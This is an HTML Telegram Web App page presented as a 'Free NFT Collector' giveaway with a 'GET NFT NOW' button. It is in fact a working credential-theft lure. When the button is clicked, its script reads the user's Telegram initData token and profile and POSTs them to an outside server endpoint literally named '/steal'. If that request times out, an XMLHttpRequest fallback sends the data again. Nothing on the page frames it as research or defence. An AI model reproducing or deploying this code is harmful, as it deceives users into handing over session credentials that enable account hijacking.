<!DOCTYPE html>
<html>
<head>
    <title>Free NFT Collector</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }
        .container {
            width: 95%;
            max-width: 500px;
            padding: 30px;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        button {
            padding: 18px 36px;
            font-size: 20px;
            cursor: pointer;
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            color: white;
            border: none;
            border-radius: 50px;
            margin: 25px 0;
            transition: all 0.3s;
            font-weight: bold;
        }
        button:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 30px rgba(37, 117, 252, 0.5);
        }
        .error {
            color: #ff3860;
            padding: 15px;
            border-radius: 10px;
            background: #fff5f7;
            margin-top: 20px;
        }
        .success {
            color: #23d160;
            padding: 15px;
            border-radius: 10px;
            background: #f5fffd;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="color: #2575fc;">üé® Free NFT Collector</h1>
        <p>Click the button to claim your exclusive NFT</p>

        <button id="get-nft">‚ú® GET NFT NOW</button>

        <div id="status" class="error" style="display:none;">
            Status: <span id="status-text"></span>
        </div>
    </div>

    <script>
        // 1. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WebApp
        try {
            Telegram.WebApp.ready();
            console.log("Telegram WebApp initialized");
        } catch (e) {
            showError("WebApp init error: " + e.message);
        }

        // 2. –û—Å–Ω–æ–≤–Ω—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã
        const button = document.getElementById('get-nft');
        const statusEl = document.getElementById('status');
        const statusText = document.getElementById('status-text');

        // 3. –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞
        function showError(message) {
            statusText.textContent = message;
            statusEl.style.display = 'block';
            statusEl.className = 'error';
            console.error(message);
        }

        function showSuccess(message) {
            statusText.textContent = message;
            statusEl.style.display = 'block';
            statusEl.className = 'success';
            console.log(message);
        }

        function hideStatus() {
            statusEl.style.display = 'none';
        }

        // 4. –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏
        button.addEventListener('click', async function() {
            hideStatus();
            button.disabled = true;
            button.textContent = 'Processing...';

            try {
                // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                const user = Telegram.WebApp.initDataUnsafe.user;
                if (!user || !user.id) {
                    throw new Error("User data not available");
                }

                // –§–æ—Ä–º–∏—Ä—É–µ–º –∑–∞–ø—Ä–æ—Å
                const payload = {
                    token: Telegram.WebApp.initData,
                    user: user
                };

                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å
                showSuccess("Sending request to server...");

                // –û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ —Å —Ç–∞–π–º–∞—É—Ç–æ–º
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000);

                const response = await fetch('https://nftsssf-juerasd.amvera.io/steal', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    signal: controller.signal
                });

                clearTimeout(timeoutId);

                if (!response.ok) {
                    throw new Error(`Server error: ${response.status} ${response.statusText}`);
                }

                const data = await response.json();

                if (data.success) {
                    showSuccess("NFT successfully claimed!");
                    alert("üéâ Success! Your NFT has been collected.");
                } else {
                    throw new Error(data.error || "Unknown server error");
                }
            } catch (error) {
                showError("Error: " + error.message);

                // –ü–æ–∫–∞–∑–∞—Ç—å –ø–æ–¥—Ä–æ–±–Ω–æ—Å—Ç–∏ –≤ –∫–æ–Ω—Å–æ–ª–∏
                console.error("Fetch error details:", error);

                // –ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥
                if (error.name === 'AbortError') {
                    tryAlternativeMethod();
                }
            } finally {
                button.disabled = false;
                button.textContent = '‚ú® GET NFT NOW';
            }
        });

        // 5. –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ –æ—Ç–ø—Ä–∞–≤–∫–∏
        function tryAlternativeMethod() {
            showError("Trying alternative method...");

            // –ò—Å–ø–æ–ª—å–∑—É–µ–º XMLHttpRequest –∫–∞–∫ fallback
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://nftsssf-juerasd.amvera.io/steal');
            xhr.setRequestHeader('Content-Type', 'application/json');

            xhr.onload = function() {
                if (xhr.status >= 200 && xhr.status < 300) {
                    try {
                        const data = JSON.parse(xhr.responseText);
                        if (data.success) {
                            showSuccess("NFT claimed via alternative method!");
                        } else {
                            showError("Alternative method error: " + (data.error || "Unknown"));
                        }
                    } catch {
                        showError("Invalid response format");
                    }
                } else {
                    showError(`XHR error: ${xhr.status} ${xhr.statusText}`);
                }
            };

            xhr.onerror = function() {
                showError("XHR network error");
            };

            xhr.send(JSON.stringify({
                token: Telegram.WebApp.initData,
                user: Telegram.WebApp.initDataUnsafe.user
            }));
        }

        // 6. –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', async () => {
            try {
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å –±—ç–∫–µ–Ω–¥–∞
                const response = await fetch('https://nftsssf-juerasd.amvera.io/', {
                    method: 'GET'
                });

                if (response.ok) {
                    showSuccess("Backend is available");
                    setTimeout(hideStatus, 3000);
                } else {
                    showError("Backend check failed");
                }
            } catch (error) {
                showError("Backend connection error: " + error.message);
            }
        });
    </script>
</body>
</html>
